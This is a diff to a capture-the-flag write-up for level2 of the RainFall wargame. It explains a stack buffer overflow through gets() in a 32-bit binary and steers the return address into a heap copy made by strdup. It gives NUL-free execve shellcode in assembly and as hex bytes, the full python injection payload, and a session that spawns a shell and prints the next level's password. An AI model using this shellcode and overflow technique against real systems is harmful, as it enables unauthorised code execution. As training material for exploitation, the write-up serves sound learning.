@@ -63,11 +63,11 @@ level2:     file format elf32-i386
  804854f:       90                      nop
 ```
 
-Unlike *level2*, it does not have any existing code in the `.text` section to spawn a shell. In our exploit, we will have somehow to *add* additional code to spawn it. This is what we call a **shell code**.
+Unlike *level2*, it does not have any existing code in the `.text` section to spawn a shell. In our exploit, we will have somehow to *add* additional code to spawn it. This is what we call a **shell code** : a small piece of code used as the payload in the exploitation of a software vulnerability.
 
 In function `p`, the very unsafe `gets` get called again. Great, that is an wide open door for a **buffer overflow** : that means we can overwrite the return address of function `p` on the stack. But where should we return to ?
 
-Remember when i talked about adding additional code. We can add this code in the initial buffer that `gets` uses, and modify the return address to point into our additional code that is located into the stack.
+Remember when i talked about adding additional code. We can add this code in the initial buffer that `gets` uses, and modify the return address to point into our additional injected code that is located into the stack.
 
 But there may be a problem using this technique in this particular setup, take a look at this snippet of instructions:
 
@@ -95,4 +95,126 @@ It performs a check on the return address `ebp + 0x4` !  Basically, it checks if
 
 It echoes back when we just wrote into the buffer, and then proceed to duplicate the stack-allocated buffer into an heap-allocated region. Interesting ! So instead of modifying our return address so it points on our buffer that is allocated into the stack, we could modify it so it points into the heap-allocated region instead ! It will contains exactly the same data as it is duplicated.
 
-The challange here is that our shell code must not include any NUL byte (`0x00`), since it will end prematurely `strdup` (remember that a C string is always nul-terminated).
+The challange here is that our shell code must not include any NUL byte (`0x00`), since it will end prematurely `strdup` (remember that a C strings are always nul-terminated).
+
+## Crafting the shellcode
+
+Let's do some assembly to craft our shellcode, shall we ?
+
+```asm
+bits 32
+
+section .text
+
+global _start
+
+_start:
+    jmp .shell_define
+.ret:
+    pop ebx
+    xor eax, eax
+    mov ecx, eax
+    mov edx, eax
+    mov al, 0x0b
+    int 0x80
+.shell_define:
+    call .ret
+    shell db "/bin/sh", 0
+```
+
+This is a basic program that `execve` a shell. Note the trick to get the address of the string `/bin/sh` : at the beginning we immediately jump to a `call .ret`, which pushes the address of `/bin/sh` into the stack and jump to `pop ebx`, which pop the address of `/bin/sh` into the register `ebx`. This trick is used to dynamically get the address, since we do not know the exact address our shellcode will be injected.
+Do note that we use the **relative** version of `jmp` and `call`, so we can indicate **offsets** instead of **absolute address**.
+
+We are using x86 calling conventions and `int 0x80` to trap into kernel mode for the syscall.
+Now, let's compile the source into an object file, and dump the `.text` section :
+
+```bash
+$> nasm -f elf32 shellcode.s
+$> readelf --sections shellcode.o
+There are 15 section headers, starting at offset 0x40:
+
+Section Headers:
+  [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al
+  ...
+  [ 1] .text             PROGBITS        00000000 0002a0 00001a 00  AX  0   0 16
+  ...
+
+```
+
+Offset is `0x2a0` into the file and the size of our shellcode is `0x1a`. We can use `xxd` to extract the bytes and `sed` with some regex to format into an hex litteral :
+
+```bash
+$> xxd -l0x1a -s0x2a0 -ps shellcode.o | sed -E 's/([a-f0-9]{2})/\\x\U\1/g'
+\xEB\x0B\x5B\x31\xC0\x89\xC1\x89\xC2\xB0\x0B\xCD\x80\xE8\xF0\xFF\xFF\xFF\x2F\x62\x69\x6E\x2F\x73\x68\x00
+```
+
+This shellcode doesn't lead to any `0x00` expect for the last byte. `strdup` will stop there. Perfect !
+
+## Putting it together
+
+These are the remaining steps :
+
+  - Find how big the buffer is to know how many bytes we have to fill until overwriting the return address.
+  - Set the return address to the return address of `strdup`
+  - Craft a python command to inject our **shellcode**, filling characters, and the new **return address**.
+
+Using GDB and the disassembly, we find out that the buffer starting address is located at `ebp - 0x4c` :
+
+```
+ 80484e7:       8d 45 b4                lea    eax,[ebp-0x4c]
+ 80484ea:       89 04 24                mov    DWORD PTR [esp],eax
+ 80484ed:       e8 ce fe ff ff          call   80483c0 <gets@plt>
+```
+
+ We need to fill 76 bytes (`0x4c` is 76 in decimal) + 4 bytes (because `ebp` has been pushed to the stack, we need to add an extra 4 bytes), to get to the return address location in the stack (that is, `ebp + 4`).
+
+Let's find the return address of `strdup` by setting a breakpoint just after the call :
+
+```
+Dump of assembler code for function p:
+   0x080484d4 <+0>:     push   ebp
+   0x080484d5 <+1>:     mov    ebp,esp
+   0x080484d7 <+3>:     sub    esp, 0x68
+   ...
+   0x08048538 <+100>:   call   0x80483e0 <strdup@plt>
+   0x0804853d <+105>:   leave  
+   0x0804853e <+106>:   ret    
+End of assembler dump.
+(gdb) b *0x0804853d
+Breakpoint 1 at 0x804853d
+(gdb) r
+Starting program: /home/user/level2/level2 
+foo
+foo
+
+Breakpoint 1, 0x0804853d in p ()
+(gdb) i r eax
+eax            0x804a008        134520840
+```
+
+Our shellcode is 26 bytes long. This is the layout of the bytes we will inject :
+
+```
+[shellcode][filling][return_address]
+    26        54           4
+```
+
+This leads to the following python command :
+
+```
+python -c 'print("\xEB\x0B\x5B\x31\xC0\x89\xC1\x89\xC2\xB0\x0B\xCD\x80\xE8\xF0\xFF\xFF\xFF\x2F\x62\x69\x6E\x2F\x73\x68\x00" + "a"*54 + "\x08\xa0\x04\x08")'
+```
+
+We can then proceed to pwn this program :)
+
+```bash
+level2@RainFall:~$ (python -c 'print("\xEB\x0B\x5B\x31\xC0\x89\xC1\x89\xC2\xB0\x0B\xCD\x80\xE8\xF0\xFF\xFF\xFF\x2F\x62\x69\x6E\x2F\x73\x68\x00" + "a"*54 + "\x08\xa0\x04\x08")'; cat) | ./level2 
+�
+ [1����°
+        �����/bin/sh
+whoami
+level3
+cd ../level3
+cat .pass
+492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
+```
